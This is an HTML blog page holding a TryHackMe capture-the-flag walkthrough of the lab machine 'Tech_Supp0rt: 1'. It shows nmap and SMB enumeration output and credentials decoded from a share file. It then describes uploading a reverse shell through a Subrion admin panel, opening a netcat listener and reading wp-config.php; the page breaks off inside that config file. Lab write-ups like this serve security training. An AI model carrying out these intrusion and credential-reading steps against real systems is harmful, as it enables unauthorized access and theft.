@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>THM Writeup - Tech_Supp0rt: 1 (Easy) :: CyberSpider</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Writeup of Tech_Supp0rt: 1 from  Try Hack Me." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/tech_supp0rt-1/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/styles.css">
+
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+
+  <link rel="shortcut icon" href="/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="CyberSpider" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="THM Writeup - Tech_Supp0rt: 1 (Easy)">
+<meta property="og:description" content="Writeup of Tech_Supp0rt: 1 from  Try Hack Me." />
+<meta property="og:url" content="/posts/tech_supp0rt-1/" />
+<meta property="og:site_name" content="CyberSpider" />
+
+  
+    <meta property="og:image" content="/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-07-05 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    cyberspider@ubuntu:~$
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/archive">archive</a></li>
+        
+      
+        
+          <li><a href="/whoami">whoami</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/archive" >archive</a></li>
+        
+      
+        
+          <li><a href="/whoami" >whoami</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/tech_supp0rt-1/">THM Writeup - Tech_Supp0rt: 1 (Easy)</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-07-05</time><span class="post-author">CyberSpider</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/thm/">THM</a>&nbsp;
+      
+      #<a href="/tags/easy/">easy</a>&nbsp;
+      
+      #<a href="/tags/linux/">linux</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>The <code>Tech_Supp0rt: 1</code> machine is an easy linux box.</p>
+<h2 id="nmap-scan">Nmap Scan<a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I do a scan with <code>nmap</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -A -sC -sV  10.10.203.210           
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-01-05 16:00 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.203.210
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.068s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">996</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE     VERSION
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 108af572d7f97e14a5c54f9e978b3d58 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 7f10f557413c71dbb55bdb75c976305c <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 6b4c23506f36007ca67c1173c1a8600c <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp  open  http        Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-title: Apache2 Ubuntu Default Page: It works
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   311: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2023-01-05T21:00:52
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: -1h49m59s, deviation: 3h10m29s, median: -1s
+</span></span><span style="display:flex;"><span>| smb-os-discovery: 
+</span></span><span style="display:flex;"><span>|   OS: Windows 6.1 <span style="color:#f92672">(</span>Samba 4.3.11-Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   Computer name: techsupport
+</span></span><span style="display:flex;"><span>|   NetBIOS computer name: TECHSUPPORT<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|   Domain name: <span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|   FQDN: techsupport
+</span></span><span style="display:flex;"><span>|_  System time: 2023-01-06T02:30:54+05:30
+</span></span><span style="display:flex;"><span>| smb-security-mode: 
+</span></span><span style="display:flex;"><span>|   account_used: guest
+</span></span><span style="display:flex;"><span>|   authentication_level: user
+</span></span><span style="display:flex;"><span>|   challenge_response: supported
+</span></span><span style="display:flex;"><span>|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 23.41 seconds 
+</span></span></code></pre></div><h2 id="samba-enumeration">SAMBA Enumeration<a href="#samba-enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I a enumeration with <code>enum4linux</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$  sudo enum4linux -a 10.10.203.210 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+</span></span><span style="display:flex;"><span>Starting enum4linux v0.9.1 <span style="color:#f92672">(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span style="color:#f92672">)</span> on Thu Jan  <span style="color:#ae81ff">5</span> 16:02:09 2023
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">=========================================(</span> Target Information <span style="color:#f92672">)=========================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target ........... 10.10.203.210
+</span></span><span style="display:flex;"><span>RID Range ........ 500-550,1000-1050
+</span></span><span style="display:flex;"><span>Username ......... <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>Password ......... <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">===========================(</span> Enumerating Workgroup/Domain on 10.10.203.210 <span style="color:#f92672">)===========================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>E<span style="color:#f92672">]</span> Can<span style="color:#e6db74">&#39;t find workgroup/domain                                                                                                                                                                                                            
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> ===============================( Nbtstat Information for 10.10.203.210 )===============================
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Looking up status of 10.10.203.210                                                                                                                                                                                                         
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">No reply from 10.10.203.210
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> ===================================( Session Check on 10.10.203.210 )===================================
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] Server 10.10.203.210 allows sessions using username &#39;&#39;, password &#39;&#39;                                                                                                                                                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> ================================( Getting domain SID for 10.10.203.210 )================================
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Domain Name: WORKGROUP                                                                                                                                                                                                                     
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Domain Sid: (NULL SID)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] Can&#39;</span>t determine <span style="color:#66d9ef">if</span> host is part of domain or part of a workgroup                                                                                                                                                                       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">==================================(</span> OS information on 10.10.203.210 <span style="color:#f92672">)==================================</span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Got OS info <span style="color:#66d9ef">for</span> 10.10.203.210 from srvinfo:                                                                                                                                                                                            
+</span></span><span style="display:flex;"><span>        TECHSUPPORT    Wk Sv PrQ Unx NT SNT TechSupport server <span style="color:#f92672">(</span>Samba, Ubuntu<span style="color:#f92672">)</span>                                                                                                                                                             
+</span></span><span style="display:flex;"><span>        platform_id     :       <span style="color:#ae81ff">500</span>
+</span></span><span style="display:flex;"><span>        os version      :       6.1
+</span></span><span style="display:flex;"><span>        server type     :       0x809a03
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">=======================================(</span> Users on 10.10.203.210 <span style="color:#f92672">)=======================================</span>                       
+</span></span><span style="display:flex;"><span>Use of uninitialized value $users in print at ./enum4linux.pl line 972.                                                                                                                                                                    
+</span></span><span style="display:flex;"><span>Use of uninitialized value $users in pattern match <span style="color:#f92672">(</span>m//<span style="color:#f92672">)</span> at ./enum4linux.pl line 975.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Use of uninitialized value $users in print at ./enum4linux.pl line 986.
+</span></span><span style="display:flex;"><span>Use of uninitialized value $users in pattern match <span style="color:#f92672">(</span>m//<span style="color:#f92672">)</span> at ./enum4linux.pl line 988.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">=================================(</span> Share Enumeration on 10.10.203.210 <span style="color:#f92672">)=================================</span>   
+</span></span><span style="display:flex;"><span>        Sharename       Type      Comment
+</span></span><span style="display:flex;"><span>        ---------       ----      -------
+</span></span><span style="display:flex;"><span>        print$          Disk      Printer Drivers
+</span></span><span style="display:flex;"><span>        websvr          Disk      
+</span></span><span style="display:flex;"><span>        IPC$            IPC       IPC Service <span style="color:#f92672">(</span>TechSupport server <span style="color:#f92672">(</span>Samba, Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>Reconnecting with SMB1 <span style="color:#66d9ef">for</span> workgroup listing.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Server               Comment
+</span></span><span style="display:flex;"><span>        ---------            -------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Workgroup            Master
+</span></span><span style="display:flex;"><span>        ---------            -------
+</span></span><span style="display:flex;"><span>        WORKGROUP            
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Attempting to map shares on 10.10.203.210                                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>//10.10.203.210/print$  Mapping: DENIED Listing: N/A Writing: N/A                                                                                                                                                                          
+</span></span><span style="display:flex;"><span>//10.10.203.210/websvr  Mapping: OK Listing: OK Writing: N/A
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>E<span style="color:#f92672">]</span> Can<span style="color:#e6db74">&#39;t understand response:                                                                                                                                                                                                             
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                                                                                                 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">//10.10.203.210/IPC$    Mapping: N/A Listing: N/A Writing: N/A
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> ===========================( Password Policy Information for 10.10.203.210 )===========================
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] Attaching to 10.10.203.210 using a NULL share
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] Trying protocol 139/SMB...
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] Found domain(s):
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        [+] TECHSUPPORT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        [+] Builtin
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] Password Info for Domain: TECHSUPPORT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        [+] Minimum password length: 5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        [+] Password history length: None
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        [+] Maximum password age: 37 days 6 hours 21 minutes 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        [+] Password Complexity Flags: 000000
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                [+] Domain Refuse Password Change: 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                [+] Domain Password Store Cleartext: 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                [+] Domain Password Lockout Admins: 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                [+] Domain Password No Clear Change: 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                [+] Domain Password No Anon Change: 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                [+] Domain Password Complex: 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        [+] Minimum password age: None
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        [+] Reset Account Lockout Counter: 30 minutes 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        [+] Locked Account Duration: 30 minutes 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        [+] Account Lockout Threshold: None
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        [+] Forced Log off Time: 37 days 6 hours 21 minutes 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] Retieved partial password policy with rpcclient:                                                                                                                                                                                       
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> ======================================( Groups on 10.10.203.210 )======================================
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] Getting builtin groups:                                                                                                                                                                                                                
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+]  Getting builtin group memberships:                                                                                                                                                                                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+]  Getting local groups:                                                                                                                                                                                                                 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] Getting local group memberships:                                                                                                                                                                                                      
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+]  Getting domain groups:                                                                                                                                                                                                                
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+]  Getting domain group memberships:                                                                                                                                                                                                     
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> ==================( Users on 10.10.203.210 via RID cycling (RIDS: 500-550,1000-1050) )==================
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[I] Found new SID:                                                                                                                                                                                                                         
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">S-1-22-1                                                                                                                                                                                                                                   
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[I] Found new SID:                                                                                                                                                                                                                         
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">S-1-5-32                                                                                                                                                                                                                                   
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[I] Found new SID:                                                                                                                                                                                                                         
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">S-1-5-32                                                                                                                                                                                                                                   
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[I] Found new SID:                                                                                                                                                                                                                         
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">S-1-5-32                                                                                                                                                                                                                                   
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[I] Found new SID:                                                                                                                                                                                                                         
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">S-1-5-32                                                                                                                                                                                                                                   
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] Enumerating users using SID S-1-5-21-2071169391-1069193170-3284189824 and logon username &#39;&#39;, password &#39;&#39;                                                                                                                               
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">S-1-5-21-2071169391-1069193170-3284189824-501 TECHSUPPORT\nobody (Local User)                                                                                                                                                              
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">S-1-5-21-2071169391-1069193170-3284189824-513 TECHSUPPORT\None (Domain Group)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] Enumerating users using SID S-1-22-1 and logon username &#39;&#39;, password &#39;&#39;                                                                                                                                                                
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">S-1-22-1-1000 Unix User\scamsite (Local User)                                                                                                                                                                                              
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] Enumerating users using SID S-1-5-32 and logon username &#39;&#39;, password &#39;</span><span style="color:#960050;background-color:#1e0010">&#39;</span>                                                                                                                                                                
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>S-1-5-32-544 BUILTIN<span style="color:#ae81ff">\A</span>dministrators <span style="color:#f92672">(</span>Local Group<span style="color:#f92672">)</span>                                                                                                                                                                                          
+</span></span><span style="display:flex;"><span>S-1-5-32-545 BUILTIN<span style="color:#ae81ff">\U</span>sers <span style="color:#f92672">(</span>Local Group<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>S-1-5-32-546 BUILTIN<span style="color:#ae81ff">\G</span>uests <span style="color:#f92672">(</span>Local Group<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>S-1-5-32-547 BUILTIN<span style="color:#ae81ff">\P</span>ower Users <span style="color:#f92672">(</span>Local Group<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>S-1-5-32-548 BUILTIN<span style="color:#ae81ff">\A</span>ccount Operators <span style="color:#f92672">(</span>Local Group<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>S-1-5-32-549 BUILTIN<span style="color:#ae81ff">\S</span>erver Operators <span style="color:#f92672">(</span>Local Group<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>S-1-5-32-550 BUILTIN<span style="color:#ae81ff">\P</span>rint Operators <span style="color:#f92672">(</span>Local Group<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">===============================(</span> Getting printer info <span style="color:#66d9ef">for</span> 10.10.203.210 <span style="color:#f92672">)===============================</span>
+</span></span><span style="display:flex;"><span>No printers returned.                                                                                                                                                                                                                      
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>enum4linux complete on Thu Jan  <span style="color:#ae81ff">5</span> 16:07:03 <span style="color:#ae81ff">2023</span>
+</span></span></code></pre></div><p>I do access in the <code>samba</code> and I get a file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbclient //10.10.203.210/websvr
+</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\k</span>ali<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Sat May <span style="color:#ae81ff">29</span> 03:17:38 <span style="color:#ae81ff">2021</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Sat May <span style="color:#ae81ff">29</span> 03:03:47 <span style="color:#ae81ff">2021</span>
+</span></span><span style="display:flex;"><span>  enter.txt                           N      <span style="color:#ae81ff">273</span>  Sat May <span style="color:#ae81ff">29</span> 03:17:38 <span style="color:#ae81ff">2021</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">8460484</span> blocks of size 1024. <span style="color:#ae81ff">5658240</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get  enter.txt /home/kali/Tech_Supp0rt:
+</span></span><span style="display:flex;"><span>Error opening local file /home/kali/Tech_Supp0rt:
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get enter.txt
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\e</span>nter.txt of size <span style="color:#ae81ff">273</span> as enter.txt <span style="color:#f92672">(</span>1.3 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 1.3 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls -all
+</span></span><span style="display:flex;"><span>NT_STATUS_NO_SUCH_FILE listing <span style="color:#ae81ff">\-</span>all
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> cd ..
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Sat May <span style="color:#ae81ff">29</span> 03:17:38 <span style="color:#ae81ff">2021</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Sat May <span style="color:#ae81ff">29</span> 03:03:47 <span style="color:#ae81ff">2021</span>
+</span></span><span style="display:flex;"><span>  enter.txt                           N      <span style="color:#ae81ff">273</span>  Sat May <span style="color:#ae81ff">29</span> 03:17:38 <span style="color:#ae81ff">2021</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">8460484</span> blocks of size 1024. <span style="color:#ae81ff">5658240</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ^C
+</span></span></code></pre></div><p>I crack the password From Base58, From Base32, From Base64 - CyberChef (gchq.github.io) and I discover this credentials:</p>
+<pre tabindex="0"><code>- Username: admin
+- Password: Scam2021
+</code></pre><p>I see the file &ldquo;robots.txt&rdquo; in this directory <code>http://10.10.203.210/subrion/robots.txt</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>User-agent: *
+</span></span><span style="display:flex;"><span>Disallow: /backup/
+</span></span><span style="display:flex;"><span>Disallow: /cron/?
+</span></span><span style="display:flex;"><span>Disallow: /front/
+</span></span><span style="display:flex;"><span>Disallow: /install/
+</span></span><span style="display:flex;"><span>Disallow: /panel/
+</span></span><span style="display:flex;"><span>Disallow: /tmp/
+</span></span><span style="display:flex;"><span>Disallow: /updates/
+</span></span></code></pre></div><p>I do the login in this directory <code>http://10.10.203.210/subrion/panel/</code>
+I uploads my reverse shell in this section &ldquo;http://10.10.35.160/subrion/panel/uploads/#elf_l1_Lw&rdquo;
+I open a listening port:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nc -lnvp <span style="color:#ae81ff">1234</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1234</span> ...
+</span></span></code></pre></div><p>I go in this directory <code>http://10.10.35.160/subrion/uploads/rev.phar</code>
+I read this file <code>/var/www/html/wordpress/wp-config.php</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>/**
+</span></span><span style="display:flex;"><span> * The base configuration <span style="color:#66d9ef">for</span> WordPress
+</span></span><span style="display:flex;"><span> *
